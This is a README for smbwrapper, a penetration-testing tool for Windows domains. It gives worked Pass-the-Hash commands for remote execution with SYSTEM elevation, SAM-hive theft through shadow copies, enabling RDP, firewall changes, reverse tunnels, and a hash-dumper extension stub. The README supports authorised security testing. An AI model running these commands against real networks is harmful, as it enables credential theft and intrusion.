## SMB Wrapper ##

**smbwrapper** is a python script which provides wrappers around `smbclient` and `winexe` with added functionality and Pass-the-Hash support.

It is intended for penetration testers and security auditors who are targeting Windows/Active Directory environments.

It relies on various external tools such as slighly modified versions of `smbclient-pth`, `winexe-pth`, `xfreerdp` and `socat`. At the moment, they will **only run in Linux x64**. It should run fine in Kali 64 bits.

It also includes various windows executables that are meant to be run on targeted Windows systems, such as [socat for windows](https://github.com/jboecker/dcs-arduino-example/tree/master/socat), [MBSA](https://technet.microsoft.com/en-us/security/cc184924.aspx), [nircmd](http://nirsoft.net/utils/nircmd.html) or *runastask* (see below)

### TL;DR ##

Below are a few examples of basic usage.

Add current credentials (use password or NT hash):

	$ ./smb.py creds add MYDOMAIN\\Administrator 209C6174DA490CAEB422F3FA5A7AE634 "My Demo User"
	[*] Credentials added and marked as active.

Execute commands (use -s for LocalSystem elevation):

	$ ./smb.py exec 10.1.2.3 whoami
	mydomain\administrator

	$ ./smb.py exec -s 10.10.10.12 whoami
	nt authority\system

	$ ./smb.py exec 10.10.10.12 cmd
	Microsoft Windows [Version 6.1.7601]
	Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

	C:\Windows\system32>

Download a file locked by the system:

	$ ./smb.py vsscpy 10.10.10.12 c:\\windows\\system32\\config\\SAM /tmp/sam
	[*] Uploading script...
	[*] Running script...
	[*] Downloading file to '/tmp/sam'...
	[*] Removing temp files...
	[*] Done.

	$ file /tmp/sam 
	/tmp/sam: MS Windows registry file, NT/2000 or above

Enable RDP:

	$ ./smb.py rdp 10.10.10.12 enable
	[*] Updating Registry...
	[*] Adding firewall rule...
	[*] Success.

Open a RDP session to a host behind a firewall:

Terminal 1 - Create a reverse port forwarding tunnel

	$ ./smb.py revfwd 10.10.10.12 3389 10.10.10.13 3389
	[*] Uploading files...
	[*] Setting up local listener...
	[*] Adding firewall rule...
	[*] Success.
	[*] Creating reverse tunnel...
	[i] 10.10.10.13:3389 <--> 10.10.10.12:56789 <--> 192.168.0.1:3389
	[i] Now point your client to 192.168.0.1:3389

Terminal 2 - Connect to the local port

	$ ./smb.py rdp 192.168.0.1 RemoteUsername RemotePassword

### Help ###

	$ ./smb.py help
	smb.py v1.0.0alpha by jrm` - Run stuff remotely - Pass the Hash

	smb.py -h 				 This help
	smb.py -f <file>		 Specify an alternative credential vault

	   The following commands are currently implemented:

	   smb.py creds [ list | set | del | use ] <user> <passwd/nthash>
		Manage SMB credentials

	   smb.py exec [-s] <ip> [ user ] [ passwd/nthash ] <cmd>
		Execute a command remotely (use "cmd" for a command prompt)

	   smb.py upexec [-s] <ip> [ user ] [ passwd/nthash ] <localfile.exe [-arg1 [-argx]]>
		Upload a file and run it remotely with the specified arguments

	   smb.py upload [-s] <ip> [ user ] [ passwd/nthash ] <localfile> <remotefile>
		Upload a file to the host

	   smb.py download [-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
		Download a file from the host

	   smb.py scrshot [-s] <ip> [ user ] [ passwd/nthash ]
		Takes a screenshot of the active session

	   smb.py vsscpy [-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
		Use shadow copies to download a locked file from the host

	   smb.py fwrule [-s] <ip> [ user ] [ password ] <add | del> <program path | port number>
		Create or remove a rule in the Windows firewall

	   smb.py mount <ip> [ user ] [ password ] <share> <localpath>
		Mount a remote share locally via CIFS (Pass-the-Hash not available)

	   smb.py rdp <ip> [ user ] [ passwd/nthash ] [ enable | disable ]
		Open a Remote Desktop session using xfreerdp (Pass-the-Hash = restricted admin)

	   smb.py portfwd [-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
		Forward a remote port to a remote address

	   smb.py revfwd [-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
		Reverse-forward a remote address/port locally

	   smb.py mbsa [-s] <ip> [ user ] [ passwd/nthash ]
		Run MBSA on the remote host

	   smb.py hash <plaintext>
		Generate a NTLM hash from a plaintext

	   If the command supports it, use the '-s' option to attempt remote LocalSystem elevation.

	   Instead of using username+password or username+hash on the commandline,
	   you can use the smb.py creds command to populate the credential vault.

	   Usernames must be specified using the DOMAIN\LOGIN syntax.

	   See usage examples at: https://github.com/jrmdev/smbwrapper/blob/master/README.md

### Credential management ###

For each command, you can specify the credentials to use on the command line. However, if you choose not to, you can maintain a credential vault.

The `smb.py creds` command allows to view and edit a credential vault in an sqlite database. It is mostly useful when working in an Active Directory environment so that you can retain the domain administrator's credentials across multiple runs without the hassle to specify them on the command line. It also makes to tool more easier and effective to work with.

**Disclamer:** The credentials are stored in clear-text in the sqlite db. Feel free to use NTLM hashes instead of passwords, or not to use this feature at all.

### Writing a quick extension ###

The way **smbwrapper** is designed enables it to be extensible very easily. Just create your own function at the end of the script with a name starting by "smb_".

For example, if you want it to support your *super-cool custom-made antivirus-bypassing* hash dumper program, you would add such a function:

	def smb_hashdump():
		"""
		[-s] <ip> [ user ] [ password | ntlm_hash ]
		Dumps remote password hashes using my prog.
		"""

		set_creds(4)
		check_creds()
		print up_and_exec(['/path/to/my/prog.exe', '--dump'])

And then run `smb.py hashdump 1.2.3.4`. That's all you need to do.

`set_creds()` parameter is the minimum length that `sys.argv` can have for the credentials to be read from the vault. If `sys.argv` length is bigger, credentials will be read from the command-line.

`check_creds()` is optional but will prevent running further commands if the credentials don't work.

*Note:* You could also simply run `smb.py upexec 1.2.3.4 /path/to/my/prog.exe --dump` but creating your own function enables you to add extra functionality easily and can be useful to parse and reuse the output.

### Tools included ###

`runastask` was developed specifiaclly for `smbwrapper`. It allows to run a GUI program from a non-console session by creating a one-time scheduled task.

It is useful for commands that need access to the user's desktop, such as `smb.py scrshot`. It takes the username to run the task with as an argument. If no matching user desktop is found, it does nothing.

`mbsacli` is the command-line version of the Microsoft Baseline Security Analyzer and is useful for reporting missing patches.

`nircmd` is a tool from NirSoft that allows to perform multiple tasks on windows hosts. For the moment it is basically used to take screenshots along with `runastask`.

`vsscpy.vbs` is a Visual Basic script used to copy locked files by making use of shadow volumes.

`socat.tar` is the tarball'ed version of socat compiled for Windows. It include some Cygwin DLL libraries.

`tar.exe` is... Guess what.
